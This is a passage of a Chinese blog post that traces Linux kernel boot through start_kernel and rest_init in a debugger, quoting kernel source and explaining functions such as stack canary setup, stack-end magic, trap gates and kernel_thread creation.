class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage __visible <span class="keyword">void</span> __init <span class="title">start_kernel</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">lockdep_init();<span class="comment">//检查内核死锁问题</span></span><br><span class="line">set_task_stack_end_magic(&amp;init_task);<span class="comment">//给栈底加个标志防止溢出</span></span><br><span class="line">smp_setup_processor_id();<span class="comment">//获取CPU硬件ID</span></span><br><span class="line">debug_objects_early_init();</span><br><span class="line"></span><br><span class="line">boot_init_stack_canary();<span class="comment">//初始化canary</span></span><br><span class="line">cgroup_init_early();</span><br><span class="line">local_irq_disable();<span class="comment">//关闭IRQ中断</span></span><br><span class="line">early_boot_irqs_disabled = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">boot_cpu_init();<span class="comment">//激活BOOT CPU</span></span><br><span class="line">page_address_init();</span><br><span class="line">pr_notice(<span class="string">&quot;%s&quot;</span>, linux_banner);<span class="comment">//打印系统内核的一些信息</span></span><br><span class="line">setup_arch(&amp;command_line);</span><br><span class="line">mm_init_cpumask(&amp;init_mm);</span><br><span class="line">setup_command_line(command_line);</span><br><span class="line">setup_nr_cpu_ids();</span><br><span class="line">setup_per_cpu_areas();</span><br><span class="line">smp_prepare_boot_cpu();<span class="comment">/* arch-specific boot-cpu hooks */</span></span><br><span class="line"></span><br><span class="line">build_all_zonelists(<span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">page_alloc_init();</span><br><span class="line"></span><br><span class="line">pr_notice(<span class="string">&quot;Kernel command line: %s\n&quot;</span>, boot_command_line);</span><br><span class="line">parse_early_param();</span><br><span class="line">after_dashes = parse_args(<span class="string">&quot;Booting kernel&quot;</span>,</span><br><span class="line">  static_command_line, __start___param,</span><br><span class="line">  __stop___param - __start___param,</span><br><span class="line">  <span class="number">-1</span>, <span class="number">-1</span>, &amp;unknown_bootoption);</span><br><span class="line"><span class="keyword">if</span> (!IS_ERR_OR_NULL(after_dashes))</span><br><span class="line">parse_args(<span class="string">&quot;Setting init args&quot;</span>, after_dashes, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">-1</span>,</span><br><span class="line">   set_init_arg);</span><br><span class="line"></span><br><span class="line">jump_label_init();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * These use large bootmem allocations and must precede</span></span><br><span class="line"><span class="comment"> * kmem_cache_init()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">setup_log_buf(<span class="number">0</span>);</span><br><span class="line">pidhash_init();</span><br><span class="line">vfs_caches_init_early();</span><br><span class="line">sort_main_extable();<span class="comment">//对内核异常表进行排序</span></span><br><span class="line">trap_init();</span><br><span class="line">mm_init();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Set up the scheduler prior starting any interrupts (such as the</span></span><br><span class="line"><span class="comment"> * timer interrupt). Full topology setup happens at smp_init()</span></span><br><span class="line"><span class="comment"> * time - but meanwhile we still have a functioning scheduler.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">sched_init();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Disable preemption - early bootup scheduling is extremely</span></span><br><span class="line"><span class="comment"> * fragile until we cpu_idle() for the first time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">preempt_disable();</span><br><span class="line"><span class="keyword">if</span> (WARN(!irqs_disabled(),</span><br><span class="line"> <span class="string">&quot;Interrupts were enabled *very* early, fixing it\n&quot;</span>))</span><br><span class="line">local_irq_disable();</span><br><span class="line">idr_init_cache();</span><br><span class="line">rcu_init();</span><br><span class="line">context_tracking_init();</span><br><span class="line">radix_tree_init();</span><br><span class="line"><span class="comment">/* init some links before init_ISA_irqs() */</span></span><br><span class="line">early_irq_init();</span><br><span class="line">init_IRQ();</span><br><span class="line">tick_init();</span><br><span class="line">rcu_init_nohz();</span><br><span class="line">init_timers();</span><br><span class="line">hrtimers_init();</span><br><span class="line">softirq_init();</span><br><span class="line">timekeeping_init();</span><br><span class="line">time_init();</span><br><span class="line">sched_clock_postinit();</span><br><span class="line">perf_event_init();</span><br><span class="line">profile_init();</span><br><span class="line">call_function_init();</span><br><span class="line">WARN(!irqs_disabled(), <span class="string">&quot;Interrupts were enabled early\n&quot;</span>);</span><br><span class="line">early_boot_irqs_disabled = <span class="literal">false</span>;</span><br><span class="line">local_irq_enable();</span><br><span class="line"></span><br><span class="line">kmem_cache_init_late();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * HACK ALERT! This is early. We&#x27;re enabling the console before</span></span><br><span class="line"><span class="comment"> * we&#x27;ve done PCI setups etc, and console_init() must be aware of</span></span><br><span class="line"><span class="comment"> * this. But we do want output early, in case something goes wrong.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">console_init();</span><br><span class="line"><span class="keyword">if</span> (panic_later)</span><br><span class="line">panic(<span class="string">&quot;Too many boot %s vars at `%s&#x27;&quot;</span>, panic_later,</span><br><span class="line">      panic_param);</span><br><span class="line"></span><br><span class="line">lockdep_info();</span><br><span class="line"></span><br><span class="line">locking_selftest();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_BLK_DEV_INITRD</span></span><br><span class="line"><span class="keyword">if</span> (initrd_start &amp;&amp; !initrd_below_start_ok &amp;&amp;</span><br><span class="line">    page_to_pfn(virt_to_page((<span class="keyword">void</span> *)initrd_start)) &lt; min_low_pfn) &#123;</span><br><span class="line">pr_crit(<span class="string">&quot;initrd overwritten (0x%08lx &lt; 0x%08lx) - disabling it.\n&quot;</span>,</span><br><span class="line">    page_to_pfn(virt_to_page((<span class="keyword">void</span> *)initrd_start)),</span><br><span class="line">    min_low_pfn);</span><br><span class="line">initrd_start = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">page_cgroup_init();</span><br><span class="line">debug_objects_mem_init();</span><br><span class="line">kmemleak_init();</span><br><span class="line">setup_per_cpu_pageset();</span><br><span class="line">numa_policy_init();</span><br><span class="line"><span class="keyword">if</span> (late_time_init)</span><br><span class="line">late_time_init();</span><br><span class="line">sched_clock_init();</span><br><span class="line">calibrate_delay();</span><br><span class="line">pidmap_init();</span><br><span class="line">anon_vma_init();</span><br><span class="line">acpi_early_init();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86</span></span><br><span class="line"><span class="keyword">if</span> (efi_enabled(EFI_RUNTIME_SERVICES))</span><br><span class="line">efi_enter_virtual_mode();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_ESPFIX64</span></span><br><span class="line"><span class="comment">/* Should be run before the first non-init thread is created */</span></span><br><span class="line">init_espfix_bsp();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">thread_info_cache_init();</span><br><span class="line">cred_init();</span><br><span class="line">fork_init(totalram_pages);</span><br><span class="line">proc_caches_init();</span><br><span class="line">buffer_init();</span><br><span class="line">key_init();</span><br><span class="line">security_init();</span><br><span class="line">dbg_late_init();</span><br><span class="line">vfs_caches_init(totalram_pages);</span><br><span class="line">signals_init();</span><br><span class="line"><span class="comment">/* rootfs populating might need page-writeback */</span></span><br><span class="line">page_writeback_init();</span><br><span class="line">proc_root_init();</span><br><span class="line">cgroup_init();</span><br><span class="line">cpuset_init();</span><br><span class="line">taskstats_init_early();</span><br><span class="line">delayacct_init();</span><br><span class="line"></span><br><span class="line">check_bugs();</span><br><span class="line"></span><br><span class="line">sfi_init_late();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (efi_enabled(EFI_RUNTIME_SERVICES)) &#123;</span><br><span class="line">efi_late_init();</span><br><span class="line">efi_free_boot_services();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ftrace_init();</span><br><span class="line"><span class="comment">/* Do the rest non-__init&#x27;ed, we&#x27;re now alive */</span></span><br><span class="line">rest_init();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>start_kernel</code>处下断点之后<code>c</code>就断下来了，可以从<code>pwngdb</code>里面看到此时的堆栈已经初始化好了，这里应该是进程内核栈：</p><img src="/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/5.jpg" class=""><h4 id="init-task"><a href="#init-task" class="headerlink" title="init_task"></a>init_task</h4><p>最最最开始的部分就是下面这个部分，当我进入的时候<code>lockdep_init()</code>已经完成了，我不信邪，重新开始想要再它那下断点，发现它并没有<code>lockdep_init</code>这个符号：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lockdep_init();</span><br><span class="line">set_task_stack_end_magic(&amp;init_task);</span><br></pre></td></tr></table></figure><p>简单看一下它的源码，首先检查<code>lockdep_init</code>是否被初始化过（它只需要初始化一次），之后就是生成了两个哈希的链表，插入自己的一个想法：如果它没有检查<code>lockdep_init</code>是否被初始化，是不是可以再一次进行初始化然后控制我们的这个链表上内容进行一下伪造呢？（突发奇想，大师傅莫怪），关于死锁检测的原理看下面的文章：</p><p><a href="https://blog.csdn.net/faxiang1230/article/details/105223966/">死锁检测lockdep实现原理</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lockdep_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lockdep_initialized)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; CLASSHASH_SIZE; i++)</span><br><span class="line">    INIT_LIST_HEAD(classhash_table + i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; CHAINHASH_SIZE; i++)</span><br><span class="line">    INIT_LIST_HEAD(chainhash_table + i);</span><br><span class="line"></span><br><span class="line">    lockdep_initialized = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在源码中会有<code>Need to run as early as possible, to initialize the lockdep hash</code>这条注释，翻译过来就是说<code>lockdep_init</code>需要尽可能的最早运行，为什么呢？其实往下看下一条指令（<code>set_task_stack_end_magic(&amp;init_task)</code>）就知道了，步入之后它就去<code>fork.c</code>了，但此进程并不是<code>fork</code>出来的，回过头看它初始化死锁也是挺有道理的，回头想想这岂不是第一个进程？答案确实是的！</p><blockquote><p>可以看出<code> init_task</code>（0 号进程）是<code>task_struct</code>类型，是进程描述符， 使用宏 INIT_TASK 对其进行初始化。</p></blockquote><img src="/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/6.png" class="" width="6"><p>刚开始看看它的源码也是挺奇怪的，它的目的是防止溢出？它在<code>stack</code>的末尾放了一个<code>STACK_END_MAGIC</code>的标志，栈溢出不是有<code>canary</code>来保护吗，为什么要两个玩意儿来保护，其实这两个有着本质的区别，<code>canary</code>是保护返回地址不被覆盖，而此处的<code>STACK_END_MAGIC</code>是保护栈的底部，防止有些恶意的数据向内存中的其他地方蔓延，此处也证明了它再进入<code>start_kernel</code>的时候已经初始化好了栈：</p><p><a href="https://blog.csdn.net/qq_41957544/article/details/117965729">start_kernel 分析 —— set_task_stack_end_magic</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_END_MAGIC0x57AC6E9D</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_task_stack_end_magic</span><span class="params">(struct task_struct *tsk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *stackend;</span><br><span class="line">    </span><br><span class="line">    stackend = end_of_stack(tsk);</span><br><span class="line">    *stackend = STACK_END_MAGIC;<span class="comment">/* for overflow detection */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="boot-init-stack-canary"><a href="#boot-init-stack-canary" class="headerlink" title="boot_init_stack_canary"></a>boot_init_stack_canary</h4><p>下面才是<code>canary</code>的初始化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boot_init_stack_canary();</span><br></pre></td></tr></table></figure><p>熟悉<code>PWN</code>的选手对于<code>canary</code>可能都不会太陌生，这里就稍微介绍一下，利用<code>random+tsc</code>的模式来生成随机数，为啥要用两个来生成呢？答案很明显就是增加随机性嘛！然后写入到<code>idle</code>进程的<code>task_struct-&gt;stack_canary</code>中里面（这个是啥等会再说），同时还得写到<code>CPU</code>里面去：</p><p><a href="https://blog.csdn.net/sahusoft/article/details/7866536">时间戳计数器 TSC</a></p><p><a href="https://www.cnblogs.com/bigship/archive/2010/04/04/1704228.html">从Linux内核中获取真随机数</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> <span class="title">boot_init_stack_canary</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    u64 canary;</span><br><span class="line">    u64 tsc;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line">    BUILD_BUG_ON(offsetof(<span class="keyword">union</span> irq_stack_union, stack_canary) != <span class="number">40</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    get_random_bytes(&amp;canary, <span class="keyword">sizeof</span>(canary));</span><br><span class="line">    tsc = __native_read_tsc();</span><br><span class="line">    canary += tsc + (tsc &lt;&lt; <span class="number">32UL</span>);</span><br><span class="line"></span><br><span class="line">    current-&gt;stack_canary = canary;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line">    this_cpu_write(irq_stack_union.stack_canary, canary);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    this_cpu_write(stack_canary.canary, canary);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="cgroup-init-early"><a href="#cgroup-init-early" class="headerlink" title="cgroup_init_early"></a>cgroup_init_early</h4><p><code>cgroup</code>为进程的行为控制，<code>cgroup_init_early</code>做数据结构和其中链表的初始化，有个博主写的够详细了：</p><p><a href="https://blog.csdn.net/u011370207/article/details/80236674">从cgroup_init_early函数学习cgroup——初始化代码</a></p><p><a href="https://blog.csdn.net/u011370207/article/details/80235698">从cgroup_init_early函数学习cgroup——框架</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cgroup_init_early();</span><br></pre></td></tr></table></figure><p>在后面的初始<code>CPU</code>的过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">local_irq_disable();</span><br><span class="line">local_irq_enable();</span><br></pre></td></tr></table></figure><h4 id="boot-cpu-init"><a href="#boot-cpu-init" class="headerlink" title="boot_cpu_init"></a>boot_cpu_init</h4><p><code>boot_cpu_init</code>是去启动<code>boot CPU</code>的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __init <span class="title">boot_cpu_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cpu = smp_processor_id();</span><br><span class="line">    <span class="comment">/* Mark the boot cpu &quot;present&quot;, &quot;online&quot; etc for SMP and UP case */</span></span><br><span class="line">    set_cpu_online(cpu, <span class="literal">true</span>);</span><br><span class="line">    set_cpu_active(cpu, <span class="literal">true</span>);</span><br><span class="line">    set_cpu_present(cpu, <span class="literal">true</span>);</span><br><span class="line">    set_cpu_possible(cpu, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="trap-init"><a href="#trap-init" class="headerlink" title="trap_init"></a>trap_init</h4><p>初始化中断向量表也是很重要的一个函数，毕竟中断是计算机当中的三大法宝之一😁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trap_init();</span><br></pre></td></tr></table></figure><p>下面是它的源码，看着挺长但总共也就四个函数分别是<code>set_trap_gate</code>，<code>set_system_gate</code>，<code>c</code>，<code>outb</code></p><ul><li>set_trap_gate</li></ul><p>这个很好理解，就是设置中断向量表，看的到0号中断，1号中断…，这些在学习汇编的时候都有涉及到</p><p><a href="https://wenku.baidu.com/view/bba59d5dbe23482fb4da4c81.html">Linux0.11版本的set_trap_gate宏分析</a></p><ul><li>set_system_gate</li></ul><p>设置系统的中断向量表，和上面的一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trap_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="comment">//设置系统的硬件中断 中断位于kernel/asm.s 或 system_call.s</span></span><br><span class="line">set_trap_gate(<span class="number">0</span>,÷_error);<span class="comment">//0中断，位于/kernel/asm.s 19行</span></span><br><span class="line">set_trap_gate(<span class="number">1</span>,&amp;debug);</span><br><span class="line">set_trap_gate(<span class="number">2</span>,&amp;nmi);</span><br><span class="line">set_system_gate(<span class="number">3</span>,&amp;int3);<span class="comment">/* int3-5 can be called from all */</span></span><br><span class="line">set_system_gate(<span class="number">4</span>,&amp;overflow);</span><br><span class="line">set_system_gate(<span class="number">5</span>,&amp;bounds);</span><br><span class="line">set_trap_gate(<span class="number">6</span>,&amp;invalid_op);</span><br><span class="line">set_trap_gate(<span class="number">7</span>,&amp;device_not_available);</span><br><span class="line">set_trap_gate(<span class="number">8</span>,&amp;double_fault);</span><br><span class="line">set_trap_gate(<span class="number">9</span>,&amp;coprocessor_segment_overrun);</span><br><span class="line">set_trap_gate(<span class="number">10</span>,&amp;invalid_TSS);</span><br><span class="line">set_trap_gate(<span class="number">11</span>,&amp;segment_not_present);</span><br><span class="line">set_trap_gate(<span class="number">12</span>,&amp;stack_segment);</span><br><span class="line">set_trap_gate(<span class="number">13</span>,&amp;general_protection);</span><br><span class="line">set_trap_gate(<span class="number">14</span>,&amp;page_fault);</span><br><span class="line">set_trap_gate(<span class="number">15</span>,&amp;reserved);</span><br><span class="line">set_trap_gate(<span class="number">16</span>,&amp;coprocessor_error);</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">17</span>;i&lt;<span class="number">48</span>;i++)</span><br><span class="line">set_trap_gate(i,&amp;reserved);</span><br><span class="line">set_trap_gate(<span class="number">45</span>,&amp;irq13);</span><br><span class="line">outb_p(inb_p(<span class="number">0x21</span>)&amp;<span class="number">0xfb</span>,<span class="number">0x21</span>);<span class="comment">//设置CPU电平</span></span><br><span class="line">outb(inb_p(<span class="number">0xA1</span>)&amp;<span class="number">0xdf</span>,<span class="number">0xA1</span>);</span><br><span class="line">set_trap_gate(<span class="number">39</span>,&amp;parallel_interrupt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="rest-init"><a href="#rest-init" class="headerlink" title="rest_init"></a>rest_init</h4><p>完成之前的初始之后就进入了一个很关键的函数<code>rest_init();</code>，此函数在<code>linux-3.18.6/init/main.c</code>，下面就是它的源码，此函数完成以后，内核的初始化工作就已经全部完成，接下来看看它到底做了什么工作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> noinline <span class="keyword">void</span> __init_refok <span class="title">rest_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> pid;</span><br><span class="line"></span><br><span class="line">rcu_scheduler_starting();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We need to spawn init first so that it obtains pid 1, however</span></span><br><span class="line"><span class="comment"> * the init task will end up wanting to create kthreads, which, if</span></span><br><span class="line"><span class="comment"> * we schedule it before we create kthreadd, will OOPS.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">kernel_thread(kernel_init, <span class="literal">NULL</span>, CLONE_FS);</span><br><span class="line">numa_default_policy();</span><br><span class="line">pid = kernel_thread(kthreadd, <span class="literal">NULL</span>, CLONE_FS | CLONE_FILES);</span><br><span class="line">rcu_read_lock();</span><br><span class="line">kthreadd_task = find_task_by_pid_ns(pid, &amp;init_pid_ns);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line">complete(&amp;kthreadd_done);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The boot idle thread must execute schedule()</span></span><br><span class="line"><span class="comment"> * at least once to get things moving:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">init_idle_bootup_task(current);</span><br><span class="line">schedule_preempt_disabled();</span><br><span class="line"><span class="comment">/* Call into cpu_idle with preempt disabled */</span></span><br><span class="line">cpu_startup_entry(CPUHP_ONLINE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此函数之所以重要，是因为它创建了两个线程，分别是<code>kernel_init</code>和<code>kthreadd</code>，也就是说从开始的<code>init_task</code>之后又创建了两个线程，终于碰到了开头说到的1号进程和2号进程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kernel_thread(kernel_init, <span class="literal">NULL</span>, CLONE_FS);</span><br><span class="line">pid = kernel_thread(kthreadd, <span class="literal">NULL</span>, CLONE_FS | CLONE_FILES);</span><br></pre></td></tr></table></figure><p><code>kernel_thread</code>是通过<code>do_fork</code>来启动一个内核线程，线程的开启是根据<code>int (*fn)(void *)</code>这个函数指针来调用的，每个标志的含义见下面的链接：</p><p><a href="https://zhuanlan.zhihu.com/p/350520191">_do_fork函数源码解析</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">kernel_thread</span><span class="params">(<span class="keyword">int</span> (*fn)(<span class="keyword">void</span> *), <span class="keyword">void</span> *arg, <span class="keyword">unsigned</span> <span class="keyword">long</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> do_fork(flags|CLONE_VM|CLONE_UNTRACED, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fn,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span>)arg, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="kernel-init"><a href="#kernel-init" class="headerlink" title="kernel_init"></a>kernel_init</h5><p>现在就开始进入到<code>kernel_init</code>和<code>kthreadd</code>里面来看看它俩到底做了什么，首先是<code>kernel_init</code>，其实它还有个别名叫<code>init</code>进程，没错，它就是用户态进程的开端，所有的进程都是间接或直接由它生成的，但是之前听到的<code>init</code>进程都是再用户态程序当中的，而此处的<code>init</code>是处于内核当中的，所以此函数肯定存在从内核态转向用户态的过程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __ref <span class="title">kernel_init</span><span class="params">(<span class="keyword">void</span> *unused)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> 